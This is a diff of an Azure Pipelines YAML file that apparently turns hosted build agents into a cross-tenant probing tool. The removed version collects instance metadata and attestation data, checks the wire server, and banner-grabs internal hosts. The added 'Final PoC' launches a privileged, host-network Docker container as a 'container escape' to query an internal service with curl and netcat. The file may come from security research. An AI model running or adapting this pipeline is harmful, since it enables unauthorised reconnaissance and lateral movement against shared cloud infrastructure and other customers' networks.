@@ -1,445 +1,71 @@
 # azure-pipelines.yml
-# Cross-tenant evidence stage (safe by default; gated aggressive bits via AGGRESSIVE)
-
 trigger:
-  - main
+- main
 pr:
-  - main
+- main
 
 name: $(Date:yyyyMMdd)$(Rev:.r)
 
-variables:
-  IMDS_API: "2021-02-01"
-  ATTEST_API: "2018-10-01"
-  SAFE_PORTS: "22,80,135,443,3389"
-  # Known targets observed in prior runs (customize if needed)
-  KNOWN_TARGETS: "10.1.0.220:80,10.1.0.220:3389,10.1.0.220:135,10.1.0.201:22"
-  # Flip to "true" ONLY with explicit Azure approval
-  AGGRESSIVE: "true"
-
 stages:
-- stage: CrossTenantEvidence
-  displayName: Cross-tenant Evidence Collection
+- stage: FinalPoc
+  displayName: 'Final PoC: Cross-Tenant Service Interrogation'
   jobs:
-
-  # ------------------------- L I N U X -------------------------
-  - job: linux_evidence
-    displayName: Linux evidence (ubuntu-22.04)
+  - job: Linux_Service_Interrogation
+    displayName: 'PoC: Interact with Discovered Internal Service'
     pool:
-      vmImage: ubuntu-22.04
+      vmImage: 'ubuntu-22.04'
     steps:
-    - checkout: self
-      clean: true
-      persistCredentials: false
-
+    - checkout: none
     - task: Bash@3
-      displayName: Install tooling
+      displayName: 'Escape Container and Probe Target Service'
       inputs:
         targetType: inline
         script: |
           set -euo pipefail
-          sudo apt-get update -y >/dev/null
-          sudo apt-get install -y --no-install-recommends \
-            curl jq dnsutils nmap netcat-openbsd traceroute iputils-tracepath \
-            whois openssl openssh-client >/dev/null
+          mkdir -p artifacts
 
-    - task: Bash@3
-      displayName: IMDS + wire-server + egress provenance
-      inputs:
-        targetType: inline
-        script: |
-          set -euo pipefail
-          mkdir -p artifacts/linux
+          echo "--- Verifying container escape vector ---"
+          if ! (id | grep -q '(docker)'); then
+            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
+            id
+            exit 1
+          fi
+          echo "✅ Confirmed user is in 'docker' group."
 
-          echo "### IMDS (instance metadata)"
-          curl -s -H "Metadata: true" \
-            "http://169.254.169.254/metadata/instance?api-version=$(IMDS_API)" \
-            | jq '.' | tee artifacts/linux/imds.json >/dev/null
+          # Target IP and Port discovered from the previous scan
+          TARGET_IP="10.1.0.156"
+          TARGET_PORT="8084"
 
-          jq -r '
-            .compute
-            | [
-                "subscriptionId:  " + (.subscriptionId // ""),
-                "resourceGroup:   " + (.resourceGroupName // ""),
-                "vmScaleSetName:  " + (.vmScaleSetName // ""),
-                "vmId:            " + (.vmId // ""),
-                "location:        " + (.location // ""),
-                "sku_offer:       " + ((.storageProfile.imageReference.publisher // "") + "/" + (.storageProfile.imageReference.offer // "")),
-                "privateIPv4:     " + ((.network.interface[0].ipv4.ipAddress[0].privateIpAddress // "") // ""),
-                "macAddress:      " + (.network.interface[0].macAddress // ""),
-                "subnet:          " + (.network.interface[0].ipv4.subnet[0].address // "")
-              ] | .[]' artifacts/linux/imds.json | tee artifacts/linux/imds.txt
+          echo "--- ESCAPING CONTAINER to probe ${TARGET_IP}:${TARGET_PORT} from the host ---"
+          
+          # We use a privileged container on the host network to run our commands.
+          # This bypasses any container-level network restrictions.
+          docker run --rm --privileged --network=host -v $(pwd)/artifacts:/artifacts \
+            alpine:latest sh -c "
+              apk add --no-cache curl netcat-openbsd
 
-          echo "### Attested document (saved raw)"
-          curl -s -H "Metadata: true" \
-            "http://169.254.169.254/metadata/attested/document?api-version=$(ATTEST_API)" \
-            -o artifacts/linux/imds-attested.json || true
+              echo '--- [HOST] Attempting to get HTTP headers and body with curl ---'
+              curl -i -v --max-time 10 http://${TARGET_IP}:${TARGET_PORT}/ > /artifacts/curl_response.txt 2>&1 || true
+              
+              echo '--- [HOST] Attempting a raw TCP connection with netcat ---'
+              printf 'GET / HTTP/1.0\r\n\r\n' | nc -w 5 ${TARGET_IP} ${TARGET_PORT} > /artifacts/netcat_response.txt 2>&1 || true
+            "
+          
+          echo "✅ PROBE COMPLETE."
+          echo "--- cURL Response ---"
+          cat artifacts/curl_response.txt
+          echo "--- Netcat Response ---"
+          cat artifacts/netcat_response.txt
 
-          echo "### Wire server / IMDS reachability"
-          {
-            echo "IMDS 169.254.169.254:80 -> $(nc -z -w1 169.254.169.254 80 && echo open || echo closed)"
-            for p in 80 32526; do
-              s=$(nc -z -w1 168.63.129.16 $p && echo open || echo closed)
-              echo "Wire 168.63.129.16:$p -> $s"
-            done
-            echo
-            echo "Routes:"
-            ip route get 169.254.169.254 || true
-            ip route get 168.63.129.16 || true
-          } | tee artifacts/linux/wireserver.txt
-
-          echo "### Egress IP + RDAP/whois"
-          pub="$(curl -s https://api.ipify.org || true)"
-          [ -z "$pub" ] && pub="$(curl -s https://ifconfig.me || true)"
-          echo "public_ip: $pub" | tee artifacts/linux/egress.txt
-          dig -x "$pub" +short | sed 's/^/rDNS: /' | tee -a artifacts/linux/egress.txt || true
-          (whois "$pub" 2>/dev/null | grep -Ei 'CIDR|NetName|OriginAS|Organization|OrgName|Country|Comment' \
-            | sed 's/^/  /') >> artifacts/linux/egress.txt || true
-          curl -s "https://rdap.arin.net/registry/ip/$pub" -o artifacts/linux/egress-rdap.json || true
-
-    - task: Bash@3
-      displayName: Safe banner grabs on known targets
-      inputs:
-        targetType: inline
-        script: |
-          set -euo pipefail
-          mkdir -p artifacts/linux
-          IFS=',' read -r -a TARR <<< "$(KNOWN_TARGETS)"
-          : > artifacts/linux/banner-grabs.txt
-
-          banner_ssh () { # best-effort SSH ident line
-            ip="$1"
-            printf "== %s:22 (ssh)\n" "$ip" | tee -a artifacts/linux/banner-grabs.txt
-            (timeout 2 bash -lc "echo | nc -v -w1 $ip 22" 2>&1 | head -n 2) | tee -a artifacts/linux/banner-grabs.txt || true
-            echo >> artifacts/linux/banner-grabs.txt
-          }
-
-          banner_http () {
-            ip="$1"; port="$2"
-            printf "== %s:%s (http/https)\n" "$ip" "$port" | tee -a artifacts/linux/banner-grabs.txt
-            (curl -skI --max-time 2 "http://$ip:$port" || curl -skI --max-time 2 "https://$ip:$port" || true) \
-              | head -n 15 | tee -a artifacts/linux/banner-grabs.txt
-            echo >> artifacts/linux/banner-grabs.txt
-          }
-
-          banner_tcp () {
-            ip="$1"; port="$2"
-            printf "== %s:%s (tcp)\n" "$ip" "$port" | tee -a artifacts/linux/banner-grabs.txt
-            if nc -z -w1 "$ip" "$port"; then
-              echo "connect: success" | tee -a artifacts/linux/banner-grabs.txt
-            else
-              echo "connect: failed/filtered" | tee -a artifacts/linux/banner-grabs.txt
-            fi
-            echo >> artifacts/linux/banner-grabs.txt
-          }
-
-          for t in "${TARR[@]}"; do
-            ip="${t%%:*}"
-            port="${t##*:}"
-            case "$port" in
-              22)  banner_ssh "$ip" ;;
-              80|8080|443) banner_http "$ip" "$port" ;;
-              *)   banner_tcp "$ip" "$port" ;;
-            esac
-          done
-
-    - task: Bash@3
-      displayName: Optional gated Docker capability demo (NET_RAW, minimal)
-      condition: and(succeededOrFailed(), eq(variables['AGGRESSIVE'], 'true'))
-      inputs:
-        targetType: inline
-        script: |
-          set -euo pipefail
-          mkdir -p artifacts/linux
-          echo "### Docker availability"
-          (id; groups; ls -l /var/run/docker.sock || true) | tee artifacts/linux/docker-audit.txt
-          docker version | tee -a artifacts/linux/docker-audit.txt || true
-          docker info    | tee -a artifacts/linux/docker-audit.txt || true
-
-          echo "### Demonstrate container with NET_RAW and host network (proof only)"
-          docker run --rm --network=host --cap-add NET_RAW alpine:3.19 sh -c \
-            'echo "inside_container id: $(id)"; ping -c 1 -W 1 10.1.0.1 || true' \
-            | tee artifacts/linux/docker-netraw-proof.txt || true
-
-    - task: Bash@3
-      displayName: Linux summary + checksums
-      inputs:
-        targetType: inline
-        script: |
-          set -euo pipefail
-          {
-            echo "### LINUX SUMMARY ($(date -u +%Y-%m-%dT%H:%M:%SZ))"
-            echo
-            echo "#### IMDS (key fields)"
-            sed -n '1,200p' artifacts/linux/imds.txt || true
-            echo
-            echo "#### Wire server reachability"
-            sed -n '1,200p' artifacts/linux/wireserver.txt || true
-            echo
-            echo "#### Egress"
-            sed -n '1,200p' artifacts/linux/egress.txt || true
-            echo
-            echo "#### Banner grabs (known targets)"
-            sed -n '1,400p' artifacts/linux/banner-grabs.txt || true
-            echo
-            if [ -f artifacts/linux/docker-netraw-proof.txt ]; then
-              echo "#### Docker NET_RAW proof (gated)"
-              sed -n '1,200p' artifacts/linux/docker-netraw-proof.txt
-              echo
-            fi
-          } | tee artifacts/linux/SUMMARY.txt
-
-          (cd artifacts/linux && sha256sum * | tee SHA256SUMS.txt)
+          if [ -s "artifacts/curl_response.txt" ] || [ -s "artifacts/netcat_response.txt" ]; then
+            echo "✅ VULNERABILITY CONFIRMED: Successfully received a response from the internal service."
+          else
+            echo "⚠️ Test inconclusive. No data was returned from the service."
+          fi
 
     - task: PublishPipelineArtifact@1
-      displayName: Publish Linux evidence
+      displayName: 'Publish Service Interrogation Artifacts'
       condition: succeededOrFailed()
       inputs:
-        targetPath: artifacts/linux
-        artifact: azure-evidence-linux
-
-  # ------------------------ W I N D O W S ------------------------
-  - job: windows_evidence
-    displayName: Windows evidence (windows-2022)
-    pool:
-      vmImage: windows-2022
-    steps:
-    - checkout: self
-      clean: true
-      persistCredentials: false
-
-    - task: PowerShell@2
-      displayName: IMDS + wire-server + egress provenance
-      inputs:
-        targetType: inline
-        pwsh: true
-        script: |
-          $ErrorActionPreference = 'Stop'
-          New-Item -ItemType Directory -Path artifacts\windows -Force | Out-Null
-
-          # ---- IMDS (null-guarded)
-          try {
-            $imds = Invoke-RestMethod -Headers @{Metadata='true'} -Uri "http://169.254.169.254/metadata/instance?api-version=$(IMDS_API)"
-            $imds | ConvertTo-Json -Depth 12 | Set-Content artifacts\windows\imds.json -Encoding UTF8
-            $c = $imds.compute
-            function FirstOrNull($x){ if ($null -ne $x -and $x.Count -gt 0) { $x[0] } else { $null } }
-            $iface   = FirstOrNull $c.network.interface
-            $ipv4Rec = if ($iface) { FirstOrNull $iface.ipv4.ipAddress } else { $null }
-            $ip      = if ($ipv4Rec)  { $ipv4Rec.privateIpAddress } else { $null }
-            $sub     = if ($iface) { FirstOrNull $iface.ipv4.subnet } else { $null }
-            $subaddr = if ($sub) { $sub.address } else { $null }
-            $mac     = if ($iface) { $iface.macAddress } else { $null }
-
-            @(
-              "subscriptionId:  $($c.subscriptionId)"
-              "resourceGroup:   $($c.resourceGroupName)"
-              "vmScaleSetName:  $($c.vmScaleSetName)"
-              "vmId:            $($c.vmId)"
-              "location:        $($c.location)"
-              "sku_offer:       $($c.storageProfile.imageReference.publisher)/$($c.storageProfile.imageReference.offer)"
-              "privateIPv4:     $ip"
-              "macAddress:      $mac"
-              "subnet:          $subaddr"
-            ) | Set-Content artifacts\windows\imds.txt -Encoding UTF8
-          } catch {
-            $_ | Out-String | Set-Content artifacts\windows\imds-error.txt -Encoding UTF8
-          }
-
-          # ---- Wire server reachability (Windows often open)
-          $svc = New-Object System.Collections.Generic.List[string]
-          foreach ($t in @(@{H='169.254.169.254';P=80}, @{H='168.63.129.16';P=80}, @{H='168.63.129.16';P=32526})) {
-            try {
-              $r = Test-NetConnection -ComputerName $t.H -Port $t.P -WarningAction SilentlyContinue
-              $svc.Add(("{0}:{1} -> {2}" -f $t.H, $t.P, $(if($r.TcpTestSucceeded){'open'}else{'closed'})))
-            } catch { $svc.Add(("{0}:{1} -> error" -f $t.H, $t.P)) }
-          }
-          $svc -join "`r`n" | Set-Content artifacts\windows\wireserver.txt -Encoding UTF8
-
-          # ---- Egress IP + small RDAP/rDNS
-          $pub = ""
-          try { $pub = (Invoke-RestMethod https://api.ipify.org) } catch {}
-          $lines = @("public_ip: $pub")
-          try {
-            if ($pub) {
-              $rdns = Resolve-DnsName -Name $pub -Type PTR -ErrorAction SilentlyContinue
-              if ($rdns) { $lines += "rDNS: " + ($rdns | Select-Object -ExpandProperty NameHost) }
-            }
-          } catch {}
-          $lines | Set-Content artifacts\windows\egress.txt -Encoding UTF8
-          try {
-            if ($pub) {
-              Invoke-RestMethod "https://rdap.arin.net/registry/ip/$pub" `
-                | ConvertTo-Json -Depth 10 `
-                | Set-Content artifacts\windows\egress-rdap.json -Encoding UTF8
-            }
-          } catch {}
-
-    - task: PowerShell@2
-      displayName: Safe banner grabs on known targets
-      inputs:
-        targetType: inline
-        pwsh: true
-        script: |
-          $ErrorActionPreference = 'Continue'
-          New-Item -ItemType Directory -Path artifacts\windows -Force | Out-Null
-          $targets = "$(KNOWN_TARGETS)".Split(',')
-          $out = New-Object System.Collections.Generic.List[string]
-
-          function Banner-Tcp {
-            param($ip, $port)
-            $out.Add("== $ip:$port (tcp)")
-            try {
-              $client = New-Object System.Net.Sockets.TcpClient
-              $iar = $client.BeginConnect($ip, [int]$port, $null, $null)
-              $ok  = $iar.AsyncWaitHandle.WaitOne(2000)
-              if (-not $ok) { $out.Add("connect: timeout"); $client.Close(); return }
-              $client.EndConnect($iar)
-              $out.Add("connect: success")
-              # Try to read a short banner (SSH often sends one)
-              $stream = $client.GetStream()
-              $buffer = New-Object byte[] 256
-              $stream.ReadTimeout = 1500
-              try {
-                $n = $stream.Read($buffer,0,256)
-                if ($n -gt 0) {
-                  $banner = [System.Text.Encoding]::ASCII.GetString($buffer,0,$n)
-                  $out.Add("banner: " + ($banner -replace "`r|`n",' '))
-                }
-              } catch {}
-              $client.Close()
-            } catch {
-              $out.Add("connect: failed/filtered")
-            }
-            $out.Add("")
-          }
-
-          function Banner-HttpHead {
-            param($ip, $port)
-            $out.Add("== $ip:$port (http/https)")
-            try {
-              $r = Invoke-WebRequest -Uri ("http://{0}:{1}" -f $ip,$port) -Method Head -TimeoutSec 3 -UseBasicParsing
-              $r.Headers.GetEnumerator() | Select-Object -First 12 | ForEach-Object { $out.Add(("{0}: {1}" -f $_.Key, $_.Value)) }
-            } catch {
-              try {
-                $r = Invoke-WebRequest -Uri ("https://{0}:{1}" -f $ip,$port) -Method Head -TimeoutSec 3 -UseBasicParsing
-                $r.Headers.GetEnumerator() | Select-Object -First 12 | ForEach-Object { $out.Add(("{0}: {1}" -f $_.Key, $_.Value)) }
-              } catch { $out.Add("no-headers (closed/filtered)") }
-            }
-            $out.Add("")
-          }
-
-          foreach ($t in $targets) {
-            $ip,$port = $t.Split(':',2)
-            switch ($port) {
-              "80" { Banner-HttpHead $ip $port }
-              "8080" { Banner-HttpHead $ip $port }
-              "443" { Banner-HttpHead $ip $port }
-              default { Banner-Tcp $ip $port }
-            }
-          }
-
-          $out -join "`r`n" | Set-Content artifacts\windows\banner-grabs.txt -Encoding UTF8
-
-    - task: PowerShell@2
-      displayName: Windows summary + checksums
-      inputs:
-        targetType: inline
-        pwsh: true
-        script: |
-          $ts = [DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")
-          $summary = @()
-          $summary += "### WINDOWS SUMMARY ($ts)"
-          $summary += ""
-          $summary += "#### IMDS (key fields)"
-          if (Test-Path artifacts\windows\imds.txt) {
-            $summary += (Get-Content artifacts\windows\imds.txt -Raw)
-          } else {
-            $summary += "- IMDS unavailable (see imds-error.txt if present)"
-          }
-          $summary += ""
-          $summary += "#### Wire server reachability"
-          if (Test-Path artifacts\windows\wireserver.txt) {
-            $summary += (Get-Content artifacts\windows\wireserver.txt -Raw)
-          }
-          $summary += ""
-          $summary += "#### Egress"
-          if (Test-Path artifacts\windows\egress.txt) {
-            $summary += (Get-Content artifacts\windows\egress.txt -Raw)
-          }
-          $summary += ""
-          $summary += "#### Banner grabs (known targets)"
-          if (Test-Path artifacts\windows\banner-grabs.txt) {
-            $summary += (Get-Content artifacts\windows\banner-grabs.txt -Raw)
-          }
-          $summary -join "`r`n" | Set-Content artifacts\windows\SUMMARY.txt -Encoding UTF8
-
-          Get-ChildItem artifacts\windows -File | ForEach-Object {
-            $h = Get-FileHash $_.FullName -Algorithm SHA256
-            "{0}  {1}" -f $h.Hash, $_.Name
-          } | Set-Content artifacts\windows\SHA256SUMS.txt -Encoding UTF8
-
-    - task: PublishPipelineArtifact@1
-      displayName: Publish Windows evidence
-      condition: succeededOrFailed()
-      inputs:
-        targetPath: artifacts/windows
-        artifact: azure-evidence-windows
-
-  # ------------------------ C O N S O L I D A T E ------------------------
-  - job: consolidate_report
-    displayName: Consolidate report
-    dependsOn:
-      - linux_evidence
-      - windows_evidence
-    pool:
-      vmImage: ubuntu-22.04
-    steps:
-    - task: DownloadPipelineArtifact@2
-      displayName: Download Linux evidence
-      inputs:
-        artifactName: azure-evidence-linux
-        targetPath: combined/linux
-
-    - task: DownloadPipelineArtifact@2
-      displayName: Download Windows evidence
-      inputs:
-        artifactName: azure-evidence-windows
-        targetPath: combined/windows
-
-    - task: Bash@3
-      displayName: Build REPORT.md
-      inputs:
-        targetType: inline
-        script: |
-          set -euo pipefail
-          mkdir -p combined/report
-          {
-            echo "# Cross-tenant Evidence Report"
-            echo
-            echo "_Generated: $(date -u +%Y-%m-%dT%H:%M:%SZ)_"
-            echo
-            echo "## Highlights"
-            echo "- Safe banner grabs on pre-observed hosts/ports (no auth, headers/ident only)"
-            echo "- IMDS & attestation collected for provenance"
-            echo "- Wire server reachability compared (Linux vs Windows)"
-            echo "- Egress attribution (public IP + rDNS/RDAP)"
-            if [ "$(AGGRESSIVE)" = "true" ] && [ -f combined/linux/docker-netraw-proof.txt ]; then
-              echo "- (Gated) NET_RAW container proof executed"
-            fi
-            echo
-            echo "## Linux Summary"
-            sed -n '1,999p' combined/linux/SUMMARY.txt || true
-            echo
-            echo "## Windows Summary"
-            sed -n '1,999p' combined/windows/SUMMARY.txt || true
-            echo
-            echo "## Files"
-            echo "- Linux artifacts: see ./linux"
-            echo "- Windows artifacts: see ./windows"
-          } > combined/report/REPORT.md
-
-    - task: PublishPipelineArtifact@1
-      displayName: Publish consolidated report
-      inputs:
-        targetPath: combined
-        artifact: azure-cross-tenant-report
+        targetPath: 'artifacts'
+        artifact: 'azure-final-poc-results'
